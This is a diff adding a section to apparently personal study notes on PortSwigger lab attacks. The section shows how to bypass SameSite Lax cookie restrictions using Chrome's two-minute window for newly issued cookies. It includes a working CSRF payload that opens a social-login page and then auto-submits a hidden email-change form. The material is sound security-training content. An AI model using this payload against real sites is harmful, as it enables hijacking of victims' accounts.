@@ -142,10 +142,29 @@ Payload
 </script>
 ```
 
-### Bypassing SameSite restrictions using on-site gadgets
+### Bypassing SameSite Lax restrictions with newly issued cookies
+Many applications does not have `SameSite` set, in which case Chrome browser will automatically sets it to `Lax` after 120 seconds. Hence, attackers have a two-minute window to perform such attacks. In other words:
+  - Attackers must make the browser issue a new cookie
+  - Deliver the payload within the two-minute time frame
+A sample payload may look like this
 
+```bash
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
 
-
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
+**NOTE:** We use `window.onclick` to invole users' interaction as browsers block pop ups by default.
 
 
 
